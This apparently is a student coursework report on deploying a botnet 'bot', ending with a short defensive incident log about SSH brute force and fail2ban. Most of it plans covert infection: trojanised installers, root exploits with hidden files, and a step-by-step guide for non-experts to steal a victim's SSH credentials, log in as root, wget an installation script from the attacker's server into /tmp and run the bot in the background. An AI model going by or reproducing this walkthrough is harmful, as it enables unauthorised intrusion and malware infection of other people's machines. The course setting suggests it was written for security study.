# Bot Deployment

Create a software installation plan for the bot. It must:

### ***outline THREE installation approaches for installation of the bot (approximately 100 words each)***

1. Using social engineering and obtain an ssh session to install the bot

    Perform an social engineering attack to obtain the credential from the victim. After getting the credential, we will ssh into the victim system. Setting up the script file at a server and download the script file at the ssh terminal of the victim machine. Run the script file will perform necessary step such as download bot, chmod the file and run the bot.

2. Provide a link which will download the file into the computer and run the script

    Firstly find a game or software which the target would install to use. Intergrate the script file into the installation file and trick the user into download the file. When the user install the software would trigger the script which will download the bot file and install into the machine and run on background.

3. Search for an exploit to actually get the user credential and install the bots

    Assume that the victim machine is vulnerable, we will find an exploit which will provide us with a shell of root access. Later on, we will manually insert all the necessary file such as downloading the bot and make it into a system file which will not be show normally. Then run the bot ourself and make it a background process so that it will not be notice.

### ***Determine ONE installation method to be used and create an ordered list of installation steps that a person with no technical expertise could follow (200 - 400 words)***

The installation method that will be use the the 1st approacher where we will use social engineering and obtain an ssh session to install the bot. There is some minor point to be noted that social engineering may be consider legal in some case but unethical to perform it. Before we perform the installation, we will assume that the user already have the bot script file, the bot command server script, the installation script ready which do not need to change anything as well as the ip address or host name of the target.

#### ***Step to perform the installation of the bot:***

***Step 1***: Firstly you need to identify the victim that you are targeting as well as which system you are targeting.

***Step 2***: Social engineering such as shoulder sniffing, man in the middle attack or other method to get username and password.
(Step 2 required soft skill as well as some basic technical skill depending on which technique you choose however in our following step we assume that the user already have the credential of the victim system)

***Step 3***: Open up the machine or computer that you would use to connect to the victim.

***Step 4***: Open up a terminal in the computer.

***Step 5***: Navigate to the folder that all the file already prepare and run the command of `python3 -m SimpleHTTPServer 9999` which will run a server for your file to be download

***Step 6***: Open up one more terminal, run `ifconfig` and find your own ip-address because it will be use later on. After that, run `./server_filename` in the folder where all the file located to run the server for the bot.

***Step 7***: Open up another terminal and run the ssh -h command to check if the package is install in the machine. If not you would need to install using `apt-get install ssh` in ubuntu machine or other have to research online. (The following step assume that all our user is using kali which have ssh come preinstalled) 

***Step 8***: Run `nmap IP-ADDRESS -p 22` in the terminal where the IP-ADDRESS is the ip address of the victim or hostname you are targeting

***Step 9***: When reading the report, if result say that port 22 is closed then just GIVE UP. (However we assume that victim already have ssh install) But if the ssh port or port 22 is open means that we can connect into the system.

***Step 10***: Run `ssh USER@IP-ADDRESS` where USER is the name of the target or try root and IP-ADDRESS is the target ip address. Assume the ip-address is 192.168.152.131 then the command will be `ssh root@192.168.152.131`

***Step 11***: When you run it will prompt for the password for the user root. Enter the password you found or the password for the user you found.

***Step 12***: Congratulation, you are now in the victim machine. You will need to navigate to the tmp folder with `cd /tmp/` and enter then enter the `pwd` command to check if you are at the tmp folder.

***Step 13***: Run the command `wget http://10.1.6.123/installation.sh` command to download the file into the machine assume that the ip address that you got from step 5 is 10.1.6.123

***Step 14***: step 13 will download a file from your machine to victim machine which if you run `ls` you will find the file is in there. Run the `chmod +x installation.sh` to give access for the file so that it can be execute.

***Step 15***: run the command of `./installation.sh` and it will download some file and start running the bot in the background.
Lastly: Run `ps aux | grep bot.py` you will see there is one process where the bot is running. (Notes: bot.py is the name of the file and can be depend on what file you have name it)

### ***list the requirements for the client and server machines to run the bot (100 - 200 words)***

- Server server 
    - require ssh capabilities
    - python3 installed

- Client Server
    - Have openSSH installed and port 22 is configure to be open by the firewall and allow connection
    - Have python3 package install in the machine
    - Have wget capabilities to download file into the machine
    - Have the access right to chmod for the file and run the file

### ***outline of how at least TWO security features in a network can affect the installation of the bot (150 words each)***
- Firewall
    
    Firewall are configuration for the network incoming and outgoing connection. By default firewall do not allow incoming connection from many of the port. However firewall are more lenient when come to outgoing connection. If the system have been configure to close all port connection and do not allow any outgoing or incoming connection other than from the specify port then the bot installation and running would not be able to perfrom. Other than that, if the firewall do not allow ssh from unknown ip address which have not been configure into the configuration file mean that attacker would not be able to even ssh into the system.

- Access control

    SSH might be configure to not allow direct root access using ssh connection. This may cause our connection to the system using only user acess grant and if the user do not have sudo right then it would not be able to chmod for the file because access control right may configure to disable most of the access right to secure the network. If the access right is deny, it would mean that we will not be able to install the bot into the machine.

### ***Review the security requirements for the software installation plan you created in Instruction Step 1 for the bot host machine & control server, and determine if the client and server meet the requirements for installation by explaining how features of the client system may impact the operation of the bot (400 words).***

Based on the installation method chosen, we assume that the credential that we obtain is only having normal user access and we will not be able to modify any software which required root access. Using the credential we obtain and by going through the ssh method step mention at question 1, we were able to ssh into the client machine. By ssh into the machine and download the installation script show that the client machine network security such as firewall do not block download from unknown host or ip which increase the chance of executing the bot. After running the installation script, it would install the bot and automatically run the bot on the background. WHen the bot runs, it should show the connection made at the server side and would also send back the command to the bots. We can assume that the requirement for both the client and server met. However, it doesn't mean that everything would be fine because there my be security protection at the client machine.

One of the potential client system feature would be anti-virus or anti-malware that detect the bot that is being installed or running in the background. Unless the bot is custom-made with unknown signature or pattern, the bot would be easily detected based on the signature or known pattern by the anti-malware which then the anti-malware would block the installation unless specify the bot being safe or modify using root access. Given that the nature of anti-malware would detect action that would harm the machine which if the command is just read file it might be detected however then the application execute the unistall or write function it may catch upon the command and block the access for the bot software. 

Other than that, a user level access right might not allow for running program on python(in our case our bot is programmed in python) where the installation may work but the program may not run. It may be that the root admin may have disable the user to run unwanted program which may cause harm to their system or simply the user have to right to access python. In some case where if the user is an accountant which only use application or software develop in C or other language, then it might not have any access right to run python program. Beside not having access right to run python, the user may not even have right to execute any program or install any program execpt the program allow by the administrative team or user have to sudo access. 

Last but not least, the system may have a monitoring system which will log the system activity log file and storing it for analysing. When there is program install by someone other than admin or some programing running on the background would immidiately being detected by the monitoring team and report to the security team. This may cause our bot to be stop or remove from the system.


### ***Write a log which documents a security incident which you resolved by implementing your incident response plan.*** 

A security incident mean that there is potential threat or attack target toward the system and may or may not breach into the system network. For example a scenario, when someone perform multiple failed attempt to ssh into other network would mean that there is an incident happening which someone may be trying to bruteforce into a network system using ssh or it may be someone who forgot it's credentials. Security incident may be malicious or not and every incident would be research and analyse to determine it potential threat. 

When a security incident occur, the first thing to do would be to start analyse what is the cause of incident. One of the place which security person would need to do is to read the log. Log would store all the action or activity perform during the server up time. By analysing the log only would get more detail of where is the incident or how it is attacked. For the example from previous about someone perform ssh attack, there would be a log file which would log all the attempt of ssh to the server may it be successful or unsuccessful attempt. 
The log file which log all the authentication in `/var/log/auth.log` file and it would also specify which ip address and which account it is trying to access. When this incident it found, one of the way to solve this issues is to block the ip address which is trying to access the network for next 48 hour or we could ask the user to change the password to a stronger and longer password. 

As for future security incident, we could implement an automate software that would detect multiple failed attempt as ssh attack and would automatically block the ip address of the attacker such as using fail2ban. Fail2ban would ban the ip address of the attacker who fail to provide correct credential. One reason we do not ban the ip address forever because the ip address maybe own by other people after few month and is not the attacker. For more incident notification of ban, we can configure to have a daily report showing how is perform attack and log it as an informative alert rather than only ban and not notifying anything.

By,

*Ivan Ong*

12 March 2019 1:00PM
